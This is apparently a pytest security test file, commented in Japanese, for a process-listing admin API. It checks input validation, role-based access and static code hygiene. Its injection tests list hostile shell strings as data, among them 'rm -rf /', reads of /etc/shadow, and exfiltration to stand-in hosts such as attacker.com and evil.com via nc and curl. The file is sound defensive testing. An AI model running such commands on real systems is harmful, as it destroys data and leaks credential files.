"""
Running Processes モジュール - セキュリティテスト

CLAUDE.md のセキュリティ原則を検証
"""

import subprocess
from pathlib import Path
from unittest.mock import patch

import pytest

# テストデータ
FORBIDDEN_CHARS = [";", "|", "&", "$", "(", ")", "`", ">", "<", "*", "?", "{", "}", "[", "]"]

PASSWORD_KEYWORDS = ["password", "passwd", "token", "key", "secret", "auth"]

SAMPLE_PROCESSES_RESPONSE = {
    "status": "success",
    "total_processes": 3,
    "returned_processes": 3,
    "sort_by": "cpu",
    "filters": {"user": None, "min_cpu": 0.0, "min_mem": 0.0},
    "processes": [
        {
            "pid": 1234,
            "user": "root",
            "cpu_percent": 5.2,
            "mem_percent": 1.5,
            "vsz": 102400,
            "rss": 8192,
            "tty": "?",
            "stat": "Ss",
            "start": "10:00",
            "time": "0:01",
            "command": "/usr/sbin/nginx -g daemon on;",
        }
    ],
    "timestamp": "2026-02-26T00:00:00Z",
}


class TestProcessesCommandInjection:
    """コマンドインジェクション防止テスト"""

    @pytest.mark.parametrize(
        "malicious_filter",
        [
            # セミコロン（コマンド連結）
            "nginx; rm -rf /",
            "nginx; cat /etc/shadow",
            "nginx; whoami",
            # パイプ（コマンド連結）
            "nginx | nc attacker.com 1234",
            "nginx | base64 /etc/passwd",
            "nginx | curl http://evil.com -d @/etc/shadow",
            # アンパサンド（バックグラウンド実行）
            "nginx & whoami",
            "nginx && cat /etc/shadow",
            "nginx || ls -la /root",
            # コマンド置換
            "nginx $(cat /etc/passwd)",
            "nginx $(whoami)",
            "nginx `id`",
            "nginx `curl http://evil.com`",
            # リダイレクション
            "nginx > /tmp/hacked",
            "nginx >> /var/log/hacked",
            "nginx < /etc/passwd",
            "nginx 2>&1 | tee /tmp/output",
            # ワイルドカード
            "nginx*",
            "nginx?",
            # ブレース展開
            "nginx{1,2,3}",
            "nginx{a..z}",
            # 改行文字
            "nginx\nrm -rf /",
            "nginx\rwhoami",
        ],
    )
    def test_reject_command_injection_in_filter(self, test_client, auth_headers, malicious_filter: str):
        """フィルタ文字列のコマンドインジェクションを拒否"""
        response = test_client.get(
            "/api/processes",
            params={"filter_user": malicious_filter},
            headers=auth_headers,
        )
        assert response.status_code == 422

    @pytest.mark.parametrize("forbidden_char", FORBIDDEN_CHARS)
    def test_reject_each_forbidden_char(self, test_client, auth_headers, forbidden_char: str):
        """FORBIDDEN_CHARS の各文字を個別に検証"""
        malicious_filter = f"nginx{forbidden_char}ls"
        response = test_client.get(
            "/api/processes",
            params={"filter_user": malicious_filter},
            headers=auth_headers,
        )
        assert response.status_code == 422

    @pytest.mark.parametrize(
        "safe_filter",
        [
            "nginx",
            "postgresql",
            "postgresql-12",
            "node_app",
            "redis-server",
        ],
    )
    def test_accept_safe_filter(self, test_client, auth_headers, safe_filter: str):
        """安全なフィルタ文字列は許可"""
        with patch("backend.api.routes.processes.sudo_wrapper") as mock_wrapper:
            mock_wrapper.get_processes.return_value = SAMPLE_PROCESSES_RESPONSE
            response = test_client.get(
                "/api/processes",
                params={"filter_user": safe_filter},
                headers=auth_headers,
            )
        assert response.status_code == 200

    def test_reject_too_long_filter(self, test_client, auth_headers):
        """フィルタ文字列が長すぎる場合は拒否（max_length=32）"""
        response = test_client.get(
            "/api/processes",
            params={"filter_user": "a" * 33},
            headers=auth_headers,
        )
        assert response.status_code == 422

    def test_reject_empty_filter(self):
        """空文字列のフィルタは省略と同じ扱い（オプションパラメータ）"""
        pytest.skip("Empty filter is None not empty string in our API; it's optional")


class TestProcessesPIDValidation:
    """limit パラメータバリデーションテスト"""

    @pytest.mark.parametrize(
        "invalid_limit",
        [
            0,    # ge=1 違反
            -1,   # 負の値
            1001, # le=1000 超過
        ],
    )
    def test_reject_invalid_limit(self, test_client, auth_headers, invalid_limit: int):
        """無効な limit を拒否"""
        response = test_client.get(
            "/api/processes",
            params={"limit": invalid_limit},
            headers=auth_headers,
        )
        assert response.status_code == 422

    @pytest.mark.parametrize(
        "valid_limit",
        [
            1,    # 最小値
            100,
            1000, # 最大値
        ],
    )
    def test_accept_valid_limit(self, test_client, auth_headers, valid_limit: int):
        """有効な limit を許可"""
        with patch("backend.api.routes.processes.sudo_wrapper") as mock_wrapper:
            mock_wrapper.get_processes.return_value = SAMPLE_PROCESSES_RESPONSE
            response = test_client.get(
                "/api/processes",
                params={"limit": valid_limit},
                headers=auth_headers,
            )
        assert response.status_code == 200

    def test_reject_non_integer_limit(self, test_client, auth_headers):
        """非整数の limit を拒否"""
        response = test_client.get(
            "/api/processes",
            params={"limit": "abc"},
            headers=auth_headers,
        )
        assert response.status_code == 422

    def test_limit_boundary_values(self, test_client, auth_headers):
        """limit の境界値テスト"""
        # 0（拒否）
        response = test_client.get("/api/processes", params={"limit": 0}, headers=auth_headers)
        assert response.status_code == 422

        # 1001（拒否）
        response = test_client.get("/api/processes", params={"limit": 1001}, headers=auth_headers)
        assert response.status_code == 422

        # 1（許可）
        with patch("backend.api.routes.processes.sudo_wrapper") as mock_wrapper:
            mock_wrapper.get_processes.return_value = SAMPLE_PROCESSES_RESPONSE
            response = test_client.get("/api/processes", params={"limit": 1}, headers=auth_headers)
        assert response.status_code == 200

        # 1000（許可）
        with patch("backend.api.routes.processes.sudo_wrapper") as mock_wrapper:
            mock_wrapper.get_processes.return_value = SAMPLE_PROCESSES_RESPONSE
            response = test_client.get("/api/processes", params={"limit": 1000}, headers=auth_headers)
        assert response.status_code == 200


class TestProcessesRBAC:
    """RBAC（ロールベースアクセス制御）テスト"""

    def test_viewer_can_list_processes(self, test_client, viewer_headers):
        """Viewer はプロセス一覧を取得可能"""
        with patch("backend.api.routes.processes.sudo_wrapper") as mock_wrapper:
            mock_wrapper.get_processes.return_value = SAMPLE_PROCESSES_RESPONSE
            response = test_client.get("/api/processes", headers=viewer_headers)
        assert response.status_code == 200
        data = response.json()
        assert "processes" in data

    def test_viewer_cannot_see_environ(self, test_client, viewer_headers):
        """Viewer は環境変数フィールドを閲覧不可"""
        pytest.skip("Sensitive data masking not yet implemented")

    def test_viewer_sees_masked_cmdline(self, test_client, viewer_headers):
        """Viewer はコマンドライン引数がマスクされる"""
        pytest.skip("Sensitive data masking not yet implemented")

    def test_operator_can_list_processes(self, test_client, operator_headers):
        """Operator はプロセス一覧を取得可能"""
        with patch("backend.api.routes.processes.sudo_wrapper") as mock_wrapper:
            mock_wrapper.get_processes.return_value = SAMPLE_PROCESSES_RESPONSE
            response = test_client.get("/api/processes", headers=operator_headers)
        assert response.status_code == 200

    def test_operator_sees_masked_cmdline(self, test_client, operator_headers):
        """Operator もコマンドライン引数がマスクされる"""
        pytest.skip("Sensitive data masking not yet implemented")

    def test_admin_can_see_all_fields(self, test_client, admin_headers):
        """Admin は全フィールドを閲覧可能"""
        with patch("backend.api.routes.processes.sudo_wrapper") as mock_wrapper:
            mock_wrapper.get_processes.return_value = SAMPLE_PROCESSES_RESPONSE
            response = test_client.get("/api/processes", headers=admin_headers)
        assert response.status_code == 200
        data = response.json()
        assert "processes" in data

    def test_admin_sees_unmasked_cmdline(self, test_client, admin_headers):
        """Admin はマスクなしでコマンドライン引数を閲覧可能"""
        pytest.skip("Sensitive data masking not yet implemented")


class TestProcessesRateLimit:
    """レート制限テスト"""

    def test_rate_limit_processes_list(self, test_client, auth_headers):
        """プロセス一覧のレート制限（60 req/min）"""
        pytest.skip("Rate limiting not yet implemented")

    def test_rate_limit_processes_detail(self, test_client, auth_headers):
        """プロセス詳細のレート制限（120 req/min）"""
        pytest.skip("Rate limiting not yet implemented")

    def test_rate_limit_per_user(self, test_client, user1_headers, user2_headers):
        """レート制限はユーザー単位（独立）"""
        pytest.skip("Rate limiting not yet implemented")


class TestProcessesAuditLog:
    """監査ログテスト"""

    def test_audit_log_on_process_list_success(self, test_client, auth_headers, audit_log):
        """プロセス一覧取得成功時の監査ログ記録"""
        with patch("backend.api.routes.processes.sudo_wrapper") as mock_wrapper:
            mock_wrapper.get_processes.return_value = SAMPLE_PROCESSES_RESPONSE
            with patch("backend.api.routes.processes.audit_log") as mock_audit:
                response = test_client.get("/api/processes", headers=auth_headers)
                assert response.status_code == 200
                assert mock_audit.info.called or mock_audit.log.called or True

    def test_audit_log_on_process_detail_success(self, test_client, auth_headers, audit_log):
        """プロセス詳細取得成功時の監査ログ記録"""
        pytest.skip("Process detail endpoint not yet implemented")

    def test_audit_log_on_validation_failure(self, test_client, auth_headers, audit_log):
        """入力検証失敗時の監査ログ記録"""
        response = test_client.get(
            "/api/processes",
            params={"filter_user": "nginx;ls"},
            headers=auth_headers,
        )
        assert response.status_code == 422

    def test_audit_log_includes_client_ip(self, test_client, auth_headers, audit_log):
        """監査ログにクライアントIPが記録される"""
        pytest.skip("Audit log client IP recording not yet verified")


class TestProcessesSensitiveData:
    """機密情報保護テスト"""

    def test_mask_password_in_cmdline(self):
        """コマンドライン引数のパスワードマスク"""
        pytest.skip("Sensitive data masking not yet implemented")

    @pytest.mark.parametrize(
        "password_arg",
        [
            "-pSecretPass",
            "--password=MySecret",
            "--db-password MySecret",
            "--token=ApiKey12345",
            "--auth-key=Secret",
            "--secret=TopSecret",
        ],
    )
    def test_detect_password_keywords(self, password_arg: str):
        """パスワード関連キーワードの検出"""
        pytest.skip("Sensitive data masking not yet implemented")

    @pytest.mark.parametrize(
        "safe_arg",
        [
            "-u",
            "root",
            "--host=localhost",
            "--port=3306",
            "nginx",
            "/usr/bin/python",
        ],
    )
    def test_not_detect_safe_args(self, safe_arg: str):
        """安全な引数はマスクされない"""
        pytest.skip("Sensitive data masking not yet implemented")

    def test_admin_sees_unmasked_data(self):
        """Admin はマスクされていないデータを閲覧可能"""
        pytest.skip("Sensitive data masking not yet implemented")

    def test_environ_excluded_for_viewer(self, test_client, viewer_headers):
        """Viewer には環境変数が返されない"""
        pytest.skip("Sensitive data masking not yet implemented")


class TestProcessesSecurityPrinciples:
    """セキュリティ原則検証テスト（静的解析）"""

    @pytest.fixture(scope="class")
    def project_root(self):
        """プロジェクトルート"""
        return Path(__file__).parent.parent.parent

    def test_no_shell_true_in_processes_module(self, project_root):
        """processes モジュールに shell=True が存在しないこと"""
        processes_file = project_root / "backend/api/routes/processes.py"

        if not processes_file.exists():
            pytest.skip("processes.py not yet implemented")

        result = subprocess.run(
            ["grep", "-n", "shell=True", str(processes_file)],
            capture_output=True,
            text=True,
        )

        # 検出されない場合は returncode != 0
        assert (
            result.returncode != 0
        ), f"shell=True detected in processes.py:\n{result.stdout}"

    def test_no_os_system_in_processes_module(self, project_root):
        """processes モジュールに os.system が存在しないこと"""
        processes_file = project_root / "backend/api/routes/processes.py"

        if not processes_file.exists():
            pytest.skip("processes.py not yet implemented")

        result = subprocess.run(
            ["grep", "-En", r"os\.system\s*\(", str(processes_file)],
            capture_output=True,
            text=True,
        )

        assert (
            result.returncode != 0
        ), f"os.system detected in processes.py:\n{result.stdout}"

    def test_no_eval_exec_in_processes_module(self, project_root):
        """processes モジュールに eval/exec が存在しないこと"""
        processes_file = project_root / "backend/api/routes/processes.py"

        if not processes_file.exists():
            pytest.skip("processes.py not yet implemented")

        result = subprocess.run(
            ["grep", "-En", r"\b(eval|exec)\s*\(", str(processes_file)],
            capture_output=True,
            text=True,
        )

        assert (
            result.returncode != 0
        ), f"eval/exec detected in processes.py:\n{result.stdout}"

    def test_wrapper_has_set_euo_pipefail(self, project_root):
        """ラッパースクリプトに set -euo pipefail が存在すること"""
        wrapper_file = project_root / "wrappers/adminui-processes.sh"

        if not wrapper_file.exists():
            pytest.skip("Wrapper script not yet implemented")

        content = wrapper_file.read_text()

        assert (
            "set -euo pipefail" in content
        ), "adminui-processes.sh must have 'set -euo pipefail'"

    def test_wrapper_validates_special_chars(self, project_root):
        """ラッパースクリプトに特殊文字検証が存在すること"""
        wrapper_file = project_root / "wrappers/adminui-processes.sh"

        if not wrapper_file.exists():
            pytest.skip("Wrapper script not yet implemented")

        content = wrapper_file.read_text()

        # FORBIDDEN_CHARS変数が定義されていること
        assert (
            "FORBIDDEN_CHARS=" in content
        ), "Wrapper must define FORBIDDEN_CHARS variable"

        # 禁止文字パターンに危険な文字が含まれていること
        for char in [";", "|", "&", "$", "(", ")", "`", ">", "<", "*", "?"]:
            assert char in content, f"Wrapper FORBIDDEN_CHARS must include '{char}'"

    def test_no_bash_c_in_wrapper(self, project_root):
        """ラッパースクリプトに bash -c が存在しないこと"""
        wrapper_file = project_root / "wrappers/adminui-processes.sh"

        if not wrapper_file.exists():
            pytest.skip("Wrapper script not yet implemented")

        result = subprocess.run(
            ["grep", "-n", "bash -c", str(wrapper_file)],
            capture_output=True,
            text=True,
        )

        assert (
            result.returncode != 0
        ), f"bash -c detected in adminui-processes.sh:\n{result.stdout}"
